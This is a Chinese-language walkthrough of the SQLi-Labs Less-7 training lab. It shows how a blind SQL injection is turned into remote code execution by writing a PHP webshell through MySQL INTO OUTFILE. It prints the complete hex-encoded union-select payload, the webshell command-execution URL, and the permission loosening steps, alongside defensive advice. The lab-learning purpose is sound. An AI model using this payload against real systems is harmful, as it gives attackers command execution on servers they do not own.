SQLi-Labs Less-7

2026年9月25日 SQLi-Labs Web安全 SQL注入 文件写入

一、题目信息

  • 题目名称：SQLi-Labs Less-7 (GET - Dump into outfile - String)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / 文件写入（GetShell）
  • 靶场链接：http://localhost:8081/Less-7/（本地环境）
  • 涉及工具：Chrome浏览器、Docker

二、解题步骤

1. 分析题目考什么

本题的核心考点是利用 SQL 注入进行文件写入，直接获取服务器权限（GetShell）。Less-7 完全没有数据回显，但后端 SQL 使用了双括号闭合 WHERE id=(('$id'))。攻击者需要利用 MySQL 的 INTO OUTFILE 功能，通过联合查询将一个 WebShell 文件写入服务器 Web 目录，从而将 SQL 注入漏洞升级为远程代码执行（RCE）。

2. 怎么想（破题思路）

  • 尝试 ?id=1' 报错，?id=1')) --+ 正常，确认闭合方式是 '))。
  • 尝试 union select 发现无回显位，无法直接爆数据。
  • 但题目提示“Dump into outfile”，说明允许写文件。
  • 思路：利用 union select，把包含 PHP 木马的字符串放到第三个字段，并用 into outfile '/var/www/html/shell.php' 写入服务器。
  • 由于木马包含引号，容易和 SQL 语法冲突，必须将 PHP 代码转成十六进制（Hex）。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：MySQL 配置 secure_file_priv 限制

踩坑情况：使用 into outfile 写入时，直接报错 You have an error in your SQL syntax，或者写入后访问木马 404。

原因分析：MySQL 默认的 secure_file_priv 配置为 NULL，禁止任何文件写入。

改进方式：进入 Docker 容器，执行 mysql -u root -p，运行 show variables like '%secure_file_priv%'; 确认配置。若为 NULL，则需修改 MySQL 配置文件将其设为 ""（空），并重启 MySQL 服务。

踩坑记录二：MySQL 用户对 Web 目录无写入权限

踩坑情况：配置 secure_file_priv 为空后，依旧报错无法写入。

原因分析：MySQL 进程是以 mysql 用户运行的，而 Web 根目录 /var/www/html/ 通常属于 root 用户，权限为 755（只有 root 能写）。

改进方式：在容器内执行 chmod 777 -R /var/www/html/ 赋予最高权限，让 MySQL 用户能写入文件。

踩坑记录三：文件覆盖导致报错

踩坑情况：再次执行写入 Payload 时报错。

原因分析：into outfile 不支持覆盖同名文件。如果 shell.php 已存在，再次写入会直接报语法错误。

改进方式：修改写入的文件名，如改为 shell123.php，或者先在容器内删除旧文件。

详细实操步骤（逐字解析）

第一步：测试闭合点

?id=1')) --+

逐字解析：' 闭合单引号，)) 闭合双层括号。--+ 注释掉后面的内容。如果页面回显 "You are in..."，说明闭合成功。

第二步：构造写入木马的 Payload

?id=-1')) union select 1,2,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e into outfile '/var/www/html/shell.php' --+

逐字解析：

  • ?id=-1'))：让前面的查询失效，并闭合双括号。
  • union select 1,2,：联合查询，前两个字段随便填，第三个字段放我们的木马。
  • 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e：这是 <?php system($_GET["cmd"]); ?> 的十六进制表示。用十六进制可以完美避免单双引号与 SQL 语法冲突。
  • into outfile '/var/www/html/shell.php'：将查询结果写入服务器的 /var/www/html/ 目录下，文件名为 shell.php。
  • --+：注释掉剩余的 SQL 语句。

第三步：验证 GetShell

访问：http://localhost:8081/shell.php?cmd=ls

预期结果：页面列出服务器目录文件（如你截图所示），说明木马已成功执行，服务器权限到手！

4. 怎么迁移（跨领域联想）

  • 真实渗透中的提权路径：SQL 注入写入文件（SQLi to RCE）是真实红蓝对抗中的一条经典杀伤链。攻击者先通过注入拖库，接着利用 into outfile 写入 WebShell，然后使用中国蚁剑等工具连接，最后提权拿下整个服务器。
  • 安全开发（SDL）与防御：必须使用参数化查询（Prepared Statement），并且数据库连接账号应遵循“最小权限原则”，禁止赋予写文件权限，同时要限制 secure_file_priv。
  • 十六进制编码应用：在密码学、WAF绕过、SQL注入中，十六进制编码都是非常可靠的数据传输手段，因为编码后完全由纯数字和字母（A-F）组成，不包含任何特殊符号。

三、名词大全与原理深度复盘

1. INTO OUTFILE

MySQL 提供的导出功能，允许将查询结果写入服务器本地文件。在 SQL 注入中，它常被用来写入木马。前提是数据库用户拥有文件写入权限，且路径可写。

2. secure_file_priv 配置项

MySQL 5.5.53 之后引入的安全限制。值为 NULL 代表禁止文件读写；值为空字符串代表不限制目录；值为某个路径则代表只允许在该目录下读写。攻击者常通过修改这个配置来绕过写文件限制。

3. WebShell（网页木马）

以网页文件形式存在的后门。本例中写入的 shell.php 是一个极其简单的木马，通过 GET 参数 cmd 接收系统命令并执行。

4. 0x3c3f... 十六进制编码

把 PHP 代码的每个字符转为对应的 ASCII 十六进制值。这样做的好处是：规避引号冲突。如果直接在 SQL 里写 PHP 代码，单双引号会导致 SQL 语法错误。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-1 到 Less-6 的区别：前几关都在“偷数据”（联合、报错、盲注）；而 Less-7 是“夺权限”，把漏洞从“信息泄露”升级为了“远程代码执行（RCE）”。这是质变。
  • 与文件上传漏洞的区别：文件上传是把木马传给服务器，需要绕过前端和后端校验；SQL注入写文件是让数据库替你“生成”木马，只要数据库权限和目录权限足够，不需要绕过上传限制。

2. 这种题目的出现原因

开发人员为了方便，没有限制数据库连接账号的权限（赋予了 FILE 权限）。此外，Docker 环境的 Web 目录权限可能设置得过于宽松。在真实业务中，只要数据库账号权限过大，攻击者就能利用 SQL 注入写入恶意文件。

3. 这种应用在实际中如何体现？

在红蓝对抗中，这条攻击路径往往能“一锤定音”。企业需要严格限制数据库账号权限，避免使用高权限账号连接应用，并在 Web 服务器上禁止数据库目录解析 PHP 脚本，从根本上防止 SQLi to RCE。

4. 如何抽象理解概念（大白话理解）

把数据库比作一个图书馆的档案室：

  • Less-1到6（偷数据）：你利用伪造的借书单（SQL注入），偷到了档案室里的绝密文件（数据）。
  • Less-7（写木马）：你发现图书馆还有一个“寄信通道”（into outfile）。你写了一封指令信（木马），让管理员（MySQL）通过这个通道，把信寄到了图书馆的收发室（/var/www/html/）。
  • GetShell：你跑到收发室（浏览器访问 shell.php），打开信件，发现里面是你自己写的遥控炸弹。你按下了按钮，就控制了整个图书馆。
